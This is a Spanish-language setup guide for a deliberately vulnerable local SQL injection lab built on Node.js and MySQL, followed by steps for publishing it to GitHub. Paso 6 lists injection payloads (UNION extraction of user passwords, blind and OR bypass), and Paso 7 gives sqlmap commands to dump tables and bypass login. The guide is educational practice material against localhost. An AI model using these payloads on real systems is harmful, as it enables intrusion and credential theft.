# 📖 Instrucciones Completas — SQLi Lab

> ⚠️ **SOLO USO EDUCATIVO EN ENTORNO LOCAL**  
> No despliegues este proyecto en internet ni lo uses contra sistemas sin autorización.

---

## PARTE 1 — Levantar el proyecto en local

### Paso 1 — Iniciar MySQL en XAMPP

1. Abre **XAMPP Control Panel** (búscalo en el menú inicio de Windows)
2. Haz clic en **Start** junto a **MySQL**
3. El botón debe ponerse en verde y decir **Running**
4. Opcional: también puedes iniciar **Apache** si quieres usar phpMyAdmin

> Si MySQL no inicia, el puerto 3306 puede estar ocupado.  
> Solución: abre el Task Manager → busca `mysqld.exe` → termínalo → reintenta.

---

### Paso 2 — Importar la base de datos

**Opción A — phpMyAdmin (recomendado)**

1. Con Apache corriendo, abre tu navegador en `http://localhost/phpmyadmin`
2. Haz clic en la pestaña **Importar** (arriba)
3. Haz clic en **Seleccionar archivo**
4. Selecciona el archivo `init.sql` de la carpeta del proyecto
5. Deja todo por defecto y pulsa **Importar / Go**
6. Deberías ver: ✅ *"Base de datos practica creada exitosamente"*

**Opción B — PowerShell**

```powershell
C:\xampp\mysql\bin\mysql.exe -u root practica < "C:\Users\fidel\OneDrive\Escritorio\Vulnerable\init.sql"
```

---

### Paso 3 — Instalar dependencias (solo una vez)

> Si ya tienes la carpeta `node_modules`, omite este paso.

```powershell
cd "C:\Users\fidel\OneDrive\Escritorio\Vulnerable"
npm install
```

Resultado esperado:
```
added 108 packages, and audited 109 packages
found 0 vulnerabilities
```

---

### Paso 4 — Levantar el servidor

```powershell
node app.js
```

Verás este mensaje si todo está correcto:
```
URL: http://localhost:3000
Rutas: /login  /noticias  /productos  /buscar  /perfil
```

> Para detenerlo: presiona `Ctrl + C`

---

### Paso 5 — Probar en el navegador

| URL | Qué hace |
|---|---|
| `http://localhost:3000` | Índice — muestra todas las rutas |
| `http://localhost:3000/perfil?user=admin` | Perfil del admin con token secreto |
| `http://localhost:3000/noticias?id=1` | Noticia #1 |
| `http://localhost:3000/buscar?q=laptop` | Búsqueda de productos |
| `http://localhost:3000/productos?categoria=electronica` | Lista de productos |

---

### Paso 6 — Inyecciones de prueba (copiar en el navegador)

**UNION-based — extraer tabla de usuarios:**
```
http://localhost:3000/noticias?id=-1 UNION SELECT 1,username,password,email,5,6 FROM usuarios --
```

**Blind — condición verdadera:**
```
http://localhost:3000/buscar?q=laptop' AND 1=1 --
```

**Blind — condición falsa (respuesta vacía):**
```
http://localhost:3000/buscar?q=laptop' AND 1=2 --
```

**OR bypass — ver todos los perfiles:**
```
http://localhost:3000/perfil?user=' OR 1=1 LIMIT 1 --
```

---

### Paso 7 — Atacar con sqlmap

> Requiere Python. Instalar sqlmap: `pip install sqlmap`

Abre una segunda PowerShell (deja el servidor corriendo) y ejecuta:

```bash
# Enumerar todas las bases de datos
sqlmap -u "http://localhost:3000/noticias?id=1" --dbms=mysql --dbs --batch

# Volcar tabla usuarios (contraseñas en texto plano)
sqlmap -u "http://localhost:3000/noticias?id=1" --dbms=mysql -D practica -T usuarios --dump --batch

# Login bypass
sqlmap -u "http://localhost:3000/login" --data="username=admin&password=test" --method=POST --dbms=mysql --level=3 --dbs --batch

# Blind time-based
sqlmap -u "http://localhost:3000/buscar?q=laptop" --dbms=mysql --technique=T --time-sec=3 -D practica --tables --batch
```

---

## PARTE 2 — Subir a GitHub

### Paso 1 — Verificar Git instalado

```powershell
git --version
```

Si no está instalado: **https://git-scm.com/download/win** (usa opciones por defecto)

---

### Paso 2 — Crear repositorio en GitHub

1. Ve a **https://github.com/new**
2. Ponle un nombre: `sqli-lab`
3. Elige **Public** o **Private**
4. ⚠️ **NO** marques "Add a README" ni "Add .gitignore" (ya los tienes)
5. Clic en **Create repository**
6. Copia la URL: `https://github.com/TU_USUARIO/sqli-lab.git`

---

### Paso 3 — Configurar Git (solo la primera vez)

```powershell
git config --global user.name "Tu Nombre"
git config --global user.email "tu@email.com"
```

---

### Paso 4 — Subir el proyecto

```powershell
cd "C:\Users\fidel\OneDrive\Escritorio\Vulnerable"

git init
git add .
git status                  # verifica que .env y node_modules NO aparezcan
git commit -m "feat: sqli lab educativo con 5 rutas vulnerables"
git remote add origin https://github.com/TU_USUARIO/sqli-lab.git
git branch -M main
git push -u origin main
```

---

### Paso 5 — Verificar lo subido

**Deben aparecer en GitHub:**
```
app.js, init.sql, package.json, .env.example, .gitignore, README.md, INSTRUCCIONES.md
```

**NO deben aparecer (protegidos por .gitignore):**
```
.env        <- credenciales de tu BD
node_modules/ <- demasiado pesado
```

---

### Paso 6 — Para futuros cambios

```powershell
git add .
git commit -m "descripcion del cambio"
git push
```

---

## Solución de problemas comunes

| Error | Causa | Solución |
|---|---|---|
| `ECONNREFUSED 3306` | MySQL no corre | Inicia MySQL en XAMPP |
| `Unknown database 'practica'` | BD no importada | Ejecuta init.sql en phpMyAdmin |
| `Cannot find module 'express'` | Sin dependencias | Ejecuta `npm install` |
| `EADDRINUSE 3000` | Puerto ocupado | Cambia `PORT=3001` en `.env` |
| `git: command not found` | Git no instalado | Descarga de git-scm.com |

---

## Cheat Sheet — Inicio rápido

```
1. Abrir XAMPP → clic Start en MySQL
2. cd "C:\Users\fidel\OneDrive\Escritorio\Vulnerable"
3. node app.js
4. Abrir http://localhost:3000 en el navegador
```
